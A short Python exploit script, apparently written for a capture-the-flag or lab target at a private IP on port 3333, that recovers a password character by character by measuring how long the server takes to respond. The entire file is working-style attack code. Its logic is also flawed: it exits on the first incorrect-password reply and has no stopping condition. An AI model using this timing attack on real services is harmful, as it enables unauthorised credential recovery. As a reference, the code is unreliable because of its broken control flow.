import socket
import time

def exploit():
    TCP_IP = '192.168.0.5'  # 서버 IP (실제 IP로 변경)
    TCP_PORT = 3333

    print("[+] Connecting to %s:%d" % (TCP_IP, TCP_PORT))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TCP_IP, TCP_PORT))

    password = ''
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    
    while True:
        max_time = 0
        max_char = ''

        for char in chars:
            test_password = password + char
            start_time = time.time()

            s.send(test_password.encode())
            response = s.recv(1024).decode()

            end_time = time.time()
            elapsed_time = end_time - start_time

            if "Incorrect Try Harder" in response:
                print("Incorrect password. Exiting...")
                s.close()
                return

            if elapsed_time > max_time:
                max_time = elapsed_time
                max_char = char

        password += max_char
        print("Current password:", password)

    s.close()

if __name__ == '__main__':
    exploit()

